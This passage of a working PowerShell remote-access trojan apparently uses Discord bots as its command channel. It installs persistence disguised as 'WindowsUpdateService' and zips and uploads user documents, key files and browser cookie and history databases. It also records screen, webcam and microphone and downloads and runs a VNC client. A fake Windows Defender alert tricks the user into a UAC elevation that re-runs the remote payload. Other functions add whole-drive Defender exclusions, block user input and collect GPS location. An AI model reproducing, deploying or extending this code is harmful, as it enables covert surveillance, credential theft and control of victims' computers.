        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $taskDescription -Force -ErrorAction Stop | Out-Null
        
        $totalMethods++
        $successCount++
        $results += "✓ Tâche planifiée (Au démarrage) créée"
    }
    catch {
        $results += "✗ Erreur tâche planifiée (Au démarrage): $($_.Exception.Message)"
    }
    
    # 7. Tâche planifiée - Toutes les heures (backup)
    try {
        $taskName = "WindowsUpdateServiceHourly"
        $taskDescription = "Windows Update Service Hourly"
        $taskAction = "powershell.exe"
        $taskArguments = "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
        
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        }
        
        $action = New-ScheduledTaskAction -Execute $taskAction -Argument $taskArguments
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 365)
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $taskDescription -Force -ErrorAction Stop | Out-Null
        
        $totalMethods++
        $successCount++
        $results += "✓ Tâche planifiée (Toutes les heures) créée"
    }
    catch {
        $results += "✗ Erreur tâche planifiée (Toutes les heures): $($_.Exception.Message)"
    }
    
    # 8. Clé de registre - Winlogon (si admin)
    if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
            $regName = "UserInit"
            $currentValue = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).UserInit
            if ($currentValue -and $currentValue -notlike "*$newScriptPath*") {
                $newValue = "$currentValue, powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
                Set-ItemProperty -Path $regPath -Name $regName -Value $newValue -Force -ErrorAction Stop
                $totalMethods++
                $successCount++
                $results += "✓ Clé registre Winlogon ajoutée (Admin)"
            }
        }
        catch {
            $results += "✗ Erreur clé registre Winlogon: $($_.Exception.Message)"
        }
    }
    
    # Résumé
    $summary = "Persistance installée: $successCount/$totalMethods méthodes activées`n`n" + ($results -join "`n")
    sendMsg -Message ":white_check_mark: ``$summary`` :white_check_mark:"
}

Function RemovePersistance {
    $removedCount = 0
    $results = @()
    
    # 1. Supprimer le script
    try {
        $scriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
        if (Test-Path $scriptPath) {
            Remove-Item -Path $scriptPath -Force -ErrorAction Stop
            $removedCount++
            $results += "✓ Script supprimé"
        }
    }
    catch {
        $results += "✗ Erreur suppression script: $($_.Exception.Message)"
    }
    
    # 2. Supprimer Startup VBS
    try {
        $startupVbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
        if (Test-Path $startupVbsPath) {
            Remove-Item -Path $startupVbsPath -Force -ErrorAction Stop
            $removedCount++
            $results += "✓ Startup VBS supprimé"
        }
    }
    catch {
        $results += "✗ Erreur suppression Startup VBS: $($_.Exception.Message)"
    }
    
    # 3. Supprimer Startup LNK
    try {
        $startupLnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
        if (Test-Path $startupLnkPath) {
            Remove-Item -Path $startupLnkPath -Force -ErrorAction Stop
            $removedCount++
            $results += "✓ Startup LNK supprimé"
        }
    }
    catch {
        $results += "✗ Erreur suppression Startup LNK: $($_.Exception.Message)"
    }
    
    # 4. Supprimer C:\Windows\Tasks\service.vbs
    try {
        $taskVbsPath = "C:\Windows\Tasks\service.vbs"
        if (Test-Path $taskVbsPath) {
            Remove-Item -Path $taskVbsPath -Force -ErrorAction Stop
            $removedCount++
            $results += "✓ Tasks VBS supprimé"
        }
    }
    catch {
        $results += "✗ Erreur suppression Tasks VBS: $($_.Exception.Message)"
    }
    
    # 5. Supprimer clé registre HKCU Run
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WindowsUpdateService"
        if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction Stop
            $removedCount++
            $results += "✓ Clé registre HKCU Run supprimée"
        }
    }
    catch {
        $results += "✗ Erreur suppression clé registre HKCU Run: $($_.Exception.Message)"
    }
    
    # 6. Supprimer clé registre HKCU RunOnce
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
        $regName = "WindowsUpdateService"
        if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) {
            Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction Stop
            $removedCount++
            $results += "✓ Clé registre HKCU RunOnce supprimée"
        }
    }
    catch {
        $results += "✗ Erreur suppression clé registre HKCU RunOnce: $($_.Exception.Message)"
    }
    
    # 7. Supprimer tâche planifiée (Au démarrage)
    try {
        $taskName = "WindowsUpdateService"
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
            $removedCount++
            $results += "✓ Tâche planifiée (Au démarrage) supprimée"
        }
    }
    catch {
        $results += "✗ Erreur suppression tâche planifiée (Au démarrage): $($_.Exception.Message)"
    }
    
    # 8. Supprimer tâche planifiée (Toutes les heures)
    try {
        $taskName = "WindowsUpdateServiceHourly"
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
            $removedCount++
            $results += "✓ Tâche planifiée (Toutes les heures) supprimée"
        }
    }
    catch {
        $results += "✗ Erreur suppression tâche planifiée (Toutes les heures): $($_.Exception.Message)"
    }
    
    # 9. Restaurer Winlogon (si admin)
    if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
            $regName = "UserInit"
            $currentValue = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).UserInit
            if ($currentValue -and $currentValue -like "*copy.ps1*") {
                $newValue = $currentValue -replace ", powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `".*copy.ps1`"", ""
                Set-ItemProperty -Path $regPath -Name $regName -Value $newValue -Force -ErrorAction Stop
                $removedCount++
                $results += "✓ Clé registre Winlogon restaurée (Admin)"
            }
        }
        catch {
            $results += "✗ Erreur restauration clé registre Winlogon: $($_.Exception.Message)"
        }
    }
    
    # Résumé
    if ($removedCount -gt 0) {
        $summary = "Persistance supprimée: $removedCount éléments retirés`n`n" + ($results -join "`n")
        sendMsg -Message ":white_check_mark: ``$summary`` :white_check_mark:"
    }
    else {
        sendMsg -Message ":octagonal_sign: ``Aucune persistance trouvée à supprimer`` :octagonal_sign:"
    }
}

# --------------------------------------------------------------- USER FUNCTIONS ------------------------------------------------------------------------

Function Exfiltrate {
    param ([string[]]$FileType, [string[]]$Path)
    sendMsg -Message ":file_folder: ``Exfiltration Started..`` :file_folder:"
    $maxZipFileSize = 10MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath = "$env:temp/Loot$index.zip"
    If ($Path -ne $null) {
        $foldersToSearch = "$env:USERPROFILE\" + $Path
    }
    else {
        $foldersToSearch = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\OneDrive", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos")
    }
    If ($FileType -ne $null) {
        $fileExtensions = "*." + $FileType
    }
    else {
        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
    }
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    $currentZipSize = 0
                    sendFile -sendfilePath $zipFilePath | Out-Null
                    Sleep 1
                    Remove-Item -Path $zipFilePath -Force
                    $index++
                    $zipFilePath = "$env:temp/Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
                PullMsg
                if ($response -like "kill") {
                    sendMsg -Message ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"
                    $script:previouscmd = $response
                    break
                }
            }
        }
    }
    $zipArchive.Dispose()
    sendFile -sendfilePath $zipFilePath | Out-Null
    sleep 5
    Remove-Item -Path $zipFilePath -Force
}

Function Upload {
    param ([string[]]$Path)
    if (Test-Path -Path $path) {
        $extension = [System.IO.Path]::GetExtension($path)
        if ($extension -eq ".exe" -or $extension -eq ".msi") {
            $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
            sendFile -sendfilePath $tempZipFilePath | Out-Null
            sleep 1
            Rm -Path $tempZipFilePath -Recurse -Force
        }
        else {
            sendFile -sendfilePath $Path | Out-Null
        }
    }
}

Function SpeechToText {
    Add-Type -AssemblyName System.Speech
    $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $speech.LoadGrammar($grammar)
    $speech.SetInputToDefaultAudioDevice()
    
    while ($true) {
        $result = $speech.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            sendMsg -Message "``````$results``````"
        }
        PullMsg
        if ($response -like "kill") {
            $script:previouscmd = $response
            break
        }
    }
}

Function StartUvnc {
    param([string]$ip, [string]$port)

    sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
    $tempFolder = "$env:temp\vnc"
    $vncDownload = "https://github.com/benzoXdev/assets/raw/main/winvnc.zip"
    $vncZip = "$tempFolder\winvnc.zip" 
    if (!(Test-Path -Path $tempFolder)) {
        New-Item -ItemType Directory -Path $tempFolder | Out-Null
    }  
    if (!(Test-Path -Path $vncZip)) {
        Iwr -Uri $vncDownload -OutFile $vncZip
    }
    sleep 1
    Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
    sleep 1
    rm -Path $vncZip -Force  
    $proc = "$tempFolder\winvnc.exe"
    Start-Process $proc -ArgumentList ("-run")
    sleep 2
    Start-Process $proc -ArgumentList ("-connect $ip::$port")
    
}

Function RecordScreen {
    param ([int[]]$t)
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)) {  
        GetFfmpeg
    }
    sendMsg -Message ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"
    $mkvPath = "$env:Temp\ScreenClip.mp4"
    if ($t.Length -eq 0) { $t = 10 }
    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 10 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
    # .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
    sendFile -sendfilePath $mkvPath | Out-Null
    sleep 5
    rm -Path $mkvPath -Force
}

# Manual capture functions with confirmation
Function TakePhoto {
    sendMsg -Message ":warning: ``CONFIRMATION REQUIRED: TakePhoto command received. Executing camera capture...`` :warning:"
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)) {  
        GetFfmpeg
    }
    $imagePath = "$env:Temp\Photo_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
    $Input = (Get-CimInstance Win32_PnPEntity | ? { $_.PNPClass -eq 'Camera' } | select -First 1).Name
    if (!($input)) { $Input = (Get-CimInstance Win32_PnPEntity | ? { $_.PNPClass -eq 'Image' } | select -First 1).Name }
    if ($Input) {
        try {
            .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath 2>&1 | Out-Null
            if (Test-Path $imagePath) {
                if ($global:WebcamID) {
                    sendFile -sendfilePath $imagePath -ChannelID $global:WebcamID
                    sendMsg -Message ":white_check_mark: ``Photo captured and sent successfully`` :white_check_mark:" -ChannelID $global:WebcamID
                }
                else {
                    sendFile -sendfilePath $imagePath
                    sendMsg -Message ":white_check_mark: ``Photo captured and sent successfully`` :white_check_mark:"
                }
                sleep 2
                rm -Path $imagePath -Force
            }
            else {
                sendMsg -Message ":octagonal_sign: ``Failed to capture photo`` :octagonal_sign:"
            }
        }
        catch {
            sendMsg -Message ":octagonal_sign: ``Error capturing photo: $($_.Exception.Message)`` :octagonal_sign:"
        }
    }
    else {
        sendMsg -Message ":octagonal_sign: ``No camera device found`` :octagonal_sign:"
    }
}

Function TakeScreenshot {
    sendMsg -Message ":warning: ``CONFIRMATION REQUIRED: TakeScreenshot command received. Executing screenshot capture...`` :warning:"
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)) {  
        GetFfmpeg
    }
    $screenshotPath = "$env:Temp\Screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
    try {
        .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $screenshotPath 2>&1 | Out-Null
        if (Test-Path $screenshotPath) {
            if ($global:ScreenshotID) {
                sendFile -sendfilePath $screenshotPath -ChannelID $global:ScreenshotID
                sendMsg -Message ":white_check_mark: ``Screenshot captured and sent successfully`` :white_check_mark:" -ChannelID $global:ScreenshotID
            }
            else {
                sendFile -sendfilePath $screenshotPath
                sendMsg -Message ":white_check_mark: ``Screenshot captured and sent successfully`` :white_check_mark:"
            }
            sleep 2
            rm -Path $screenshotPath -Force
        }
        else {
            sendMsg -Message ":octagonal_sign: ``Failed to capture screenshot`` :octagonal_sign:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error capturing screenshot: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function RecordAudioClip {
    param ([Parameter(Position = 0)][int]$Duration = 10)
    sendMsg -Message ":warning: ``CONFIRMATION REQUIRED: RecordAudioClip command received. Recording $Duration seconds of audio...`` :warning:"
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)) {  
        GetFfmpeg
    }
    $outputFile = "$env:Temp\AudioClip_$(Get-Date -Format 'yyyyMMdd_HHmmss').mp3"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
    function getFriendlyName($id) {
        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
        return (get-ItemProperty $reg).FriendlyName
    }
    try {
        $id1 = [audio]::GetDefault(1)
        $MicName = "$(getFriendlyName $id1)"
        .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $Duration -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile 2>&1 | Out-Null
        if (Test-Path $outputFile) {
            if ($global:MicrophoneID) {
                sendFile -sendfilePath $outputFile -ChannelID $global:MicrophoneID
                sendMsg -Message ":white_check_mark: ``Audio clip recorded and sent successfully ($Duration seconds)`` :white_check_mark:" -ChannelID $global:MicrophoneID
            }
            else {
                sendFile -sendfilePath $outputFile
                sendMsg -Message ":white_check_mark: ``Audio clip recorded and sent successfully ($Duration seconds)`` :white_check_mark:"
            }
            sleep 2
            rm -Path $outputFile -Force
        }
        else {
            sendMsg -Message ":octagonal_sign: ``Failed to record audio clip`` :octagonal_sign:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error recording audio: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

# --------------------------------------------------------------- ADMIN FUNCTIONS ------------------------------------------------------------------------

Function IsAdmin {
    If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
        sendMsg -Message ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"
    }
    else {
        sendMsg -Message ":white_check_mark: ``You are Admin!`` :white_check_mark:"
    }
}

Function Elevate {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName Microsoft.VisualBasic
    [System.Windows.Forms.Application]::EnableVisualStyles()
    $errorForm = New-Object Windows.Forms.Form
    $errorForm.Width = 400
    $errorForm.Height = 180
    $errorForm.TopMost = $true
    $errorForm.StartPosition = 'CenterScreen'
    $errorForm.Text = 'Windows Defender Alert'
    $errorForm.Font = 'Microsoft Sans Serif,10'
    $icon = [System.Drawing.SystemIcons]::Information
    $errorForm.Icon = $icon
    $errorForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
    $label = New-Object Windows.Forms.Label
    $label.AutoSize = $false
    $label.Width = 380
    $label.Height = 80
    $label.TextAlign = 'MiddleCenter'
    $label.Text = "Windows Defender has found critical vulnerabilities`n`nWindows will now attempt to apply important security updates to automatically fix these issues in the background"
    $label.Location = New-Object System.Drawing.Point(10, 10)
    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\UserAccountControlSettings.exe")
    $iconBitmap = $icon.ToBitmap()
    $resizedIcon = New-Object System.Drawing.Bitmap(16, 16)
    $graphics = [System.Drawing.Graphics]::FromImage($resizedIcon)
    $graphics.DrawImage($iconBitmap, 0, 0, 16, 16)
    $graphics.Dispose()
    $okButton = New-Object Windows.Forms.Button
    $okButton.Text = "  Apply Fix"
    $okButton.Width = 110
    $okButton.Height = 25
    $okButton.Location = New-Object System.Drawing.Point(185, 110)
    $okButton.Image = $resizedIcon
    $okButton.TextImageRelation = 'ImageBeforeText'
    $cancelButton = New-Object Windows.Forms.Button
    $cancelButton.Text = "Cancel "
    $cancelButton.Width = 80
    $cancelButton.Height = 25
    $cancelButton.Location = New-Object System.Drawing.Point(300, 110)
    $errorForm.controls.AddRange(@($label, $okButton, $cancelButton))
    $okButton.Add_Click({
            $errorForm.Close()
            $graphics.Dispose()
            # Créer un script PowerShell temporaire qui sera exécuté avec élévation
            $tempScript = "$env:TEMP\elevate_script.ps1"
            $scriptContent = @"
# Elevated Discord C2 Client
`$global:token = '$token'
`$global:parent = '$parent'
`$HideConsole = 1
`$spawnChannels = 0
`$InfoOnConnect = 0
`$defaultstart = 0
`$global:parent = '$parent'
irm `$parent | iex
"@
            $scriptContent | Out-File -FilePath $tempScript -Force -Encoding UTF8
            # Utiliser Shell.Application.ShellExecute avec runas pour obtenir les privilèges admin
            $vbsContent = @"
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "powershell.exe", "-NonI -NoP -Ep Bypass -W Hidden -File ""$tempScript""", "", "runas", 0
"@
            $vbsPath = "$env:TEMP\elevate.vbs"
            $vbsContent | Out-File -FilePath $vbsPath -Force -Encoding ASCII
            try {
                # Exécuter le script VBS qui va demander l'élévation
                $process = Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden -PassThru
                Start-Sleep -Seconds 2
                # Nettoyer les fichiers temporaires après un délai
                Start-Job -ScriptBlock {
                    Start-Sleep -Seconds 10
                    if (Test-Path "$env:TEMP\elevate.vbs") { Remove-Item -Path "$env:TEMP\elevate.vbs" -Force -ErrorAction SilentlyContinue }
                    if (Test-Path "$env:TEMP\elevate_script.ps1") { Remove-Item -Path "$env:TEMP\elevate_script.ps1" -Force -ErrorAction SilentlyContinue }
                } | Out-Null
                sendMsg -Message ":white_check_mark: ``UAC Prompt sent to the current user. Please accept to elevate privileges. A new elevated session will start in a few seconds.`` :white_check_mark:"
            }
            catch {
                sendMsg -Message ":octagonal_sign: ``Failed to elevate: $($_.Exception.Message)`` :octagonal_sign:"
            }
            return                   
        })
    $cancelButton.Add_Click({
            $errorForm.Close()
            $graphics.Dispose()
            return                    
        })
    [void]$errorForm.ShowDialog()
}

Function ExcludeCDrive {
    Add-MpPreference -ExclusionPath C:\
    sendMsg -Message ":white_check_mark: ``C:/ Drive Excluded`` :white_check_mark:"
}

Function ExcludeALLDrives {
    Add-MpPreference -ExclusionPath C:\
    Add-MpPreference -ExclusionPath D:\
    Add-MpPreference -ExclusionPath E:\
    Add-MpPreference -ExclusionPath F:\
    Add-MpPreference -ExclusionPath G:\
    sendMsg -Message ":white_check_mark: ``All Drives C:/ - G:/ Excluded`` :white_check_mark:"
}

Function EnableIO {
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($false)
    sendMsg -Message ":white_check_mark: ``IO Enabled`` :white_check_mark:"
}

Function DisableIO {
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($true)
    sendMsg -Message ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"
}

# =============================================================== MAIN FUNCTIONS =========================================================================

# Scriptblock for info + loot to discord
$dolootjob = {
    param([string]$token, [string]$LootID)
    function sendFile {
        param([string]$sendfilePath)
    
        $url = "https://discord.com/api/v10/channels/$LootID/messages"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $webClient.UploadFile($url, "POST", $sendfilePath)
                Write-Host "Attachment sent to Discord: $sendfilePath"
            }
            else {
                Write-Host "File not found: $sendfilePath"
            }
        }
    }

    function sendMsg {
        param([string]$Message)
        $url = "https://discord.com/api/v10/channels/$LootID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($Message) {
            $jsonBody = @{
                "content"  = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
            $message = $null
        }
    }

    Function BrowserDB {
        sendMsg -Message ":arrows_counterclockwise: ``Getting Browser DB Files..`` :arrows_counterclockwise:"
        $temp = [System.IO.Path]::GetTempPath() 
        $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
        $googledest = Join-Path -Path $tempFolder -ChildPath 'google'
        $mozdest = Join-Path -Path $tempFolder -ChildPath 'firefox'
        $edgedest = Join-Path -Path $tempFolder -ChildPath 'edge'
        New-Item -Path $tempFolder -ItemType Directory -Force
        sleep 1
        New-Item -Path $googledest -ItemType Directory -Force
        New-Item -Path $mozdest -ItemType Directory -Force
        New-Item -Path $edgedest -ItemType Directory -Force
        sleep 1
        
        Function CopyFiles {
            param ([string]$dbfile, [string]$folder, [switch]$db)
            $filesToCopy = Get-ChildItem -Path $dbfile -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' -or $_.Name -like 'formhistory.sqlite' -or $_.Name -like 'places.sqlite' -or $_.Name -like 'cookies.sqlite' }
            foreach ($file in $filesToCopy) {
                $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
                if ($db -eq $true) {
                    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension + '.db'
                }
                else {
                    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension 
                }
                $destination = Join-Path -Path $folder -ChildPath $newFileName
                Copy-Item -Path $file.FullName -Destination $destination -Force
            }
        } 
        
        $script:googleDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
        $script:firefoxDir = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | Where-Object { $_.Name -like '*.default-release' }; $firefoxDir = $firefoxDir.FullName
        $script:edgeDir = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
        copyFiles -dbfile $googleDir -folder $googledest -db
        copyFiles -dbfile $firefoxDir -folder $mozdest
        copyFiles -dbfile $edgeDir -folder $edgedest -db
        $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfiles.zip")
        Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
        Remove-Item -Path $tempFolder -Recurse -Force
        sendFile -sendfilePath $zipFileName
        sleep 1
        Remove-Item -Path $zipFileName -Recurse -Force
    }

    Function SystemInfo {
        sendMsg -Message ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"
        Add-Type -AssemblyName System.Windows.Forms
        # User Information
        $userInfo = Get-WmiObject -Class Win32_UserAccount
        $fullName = $($userInfo.FullName) ; $fullName = ("$fullName").TrimStart("")
        $email = (Get-ComputerInfo).WindowsRegisteredOwner
    
        # Other Users
        $users = "$($userInfo.Name)"
        $userString = "`nFull Name : $($userInfo.FullName)"
    
        # System Language
        $systemLocale = Get-WinSystemLocale
        $systemLanguage = $systemLocale.Name
    
        #Keyboard Layout
        $userLanguageList = Get-WinUserLanguageList
        $keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
    
        # OS Information
        $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
        $OSString = "$($systemInfo.Caption)"
        $WinVersion = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
        $OSArch = "$($systemInfo.OSArchitecture)"
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Width = $Screen.Width; $Height = $Screen.Height
        $screensize = "${width} x ${height}"
    
        # Enumerate Windows Activation Date
        function Convert-BytesToDatetime([byte[]]$b) { 
            [long]$f = ([long]$b[7] -shl 56) -bor ([long]$b[6] -shl 48) -bor ([long]$b[5] -shl 40) -bor ([long]$b[4] -shl 32) -bor ([long]$b[3] -shl 24) -bor ([long]$b[2] -shl 16) -bor ([long]$b[1] -shl 8) -bor [long]$b[0]
            $script:activated = [datetime]::FromFileTime($f)
        }
        $RegKey = (Get-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\ProductOptions").ProductPolicy 
        $totalSize = ([System.BitConverter]::ToUInt32($RegKey, 0))
        $policies = @()
        $value = 0x14
        while ($true) {
            $keySize = ([System.BitConverter]::ToUInt16($RegKey, $value))
            $keyNameSize = ([System.BitConverter]::ToUInt16($RegKey, $value + 2))
            $keyDataSize = ([System.BitConverter]::ToUInt16($RegKey, $value + 6))
            $keyName = [System.Text.Encoding]::Unicode.GetString($RegKey[($value + 0x10)..($value + 0xF + $keyNameSize)])
            if ($keyName -eq 'Security-SPP-LastWindowsActivationTime') {
                Convert-BytesToDatetime($RegKey[($value + 0x10 + $keyNameSize)..($value + 0xF + $keyNameSize + $keyDataSize)])
            }
            $value += $keySize
            if (($value + 4) -ge $totalSize) {
                break
            }
        }
    
        # GPS Location Info
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) { Sleep -M 100 }  
        if ($GeoWatcher.Permission -eq 'Denied') { $GPS = "Location Services Off" }
        else {
            $GL = $GeoWatcher.Position.Location | Select Latitude, Longitude
            $GL = $GL -split " "
            $Lat = $GL[0].Substring(11) -replace ".$"
            $Lon = $GL[1].Substring(10) -replace ".$"
            $GPS = "LAT = $Lat LONG = $Lon"
        }
    
        # Hardware Information
        $processorInfo = Get-WmiObject -Class Win32_Processor; $processor = "$($processorInfo.Name)"
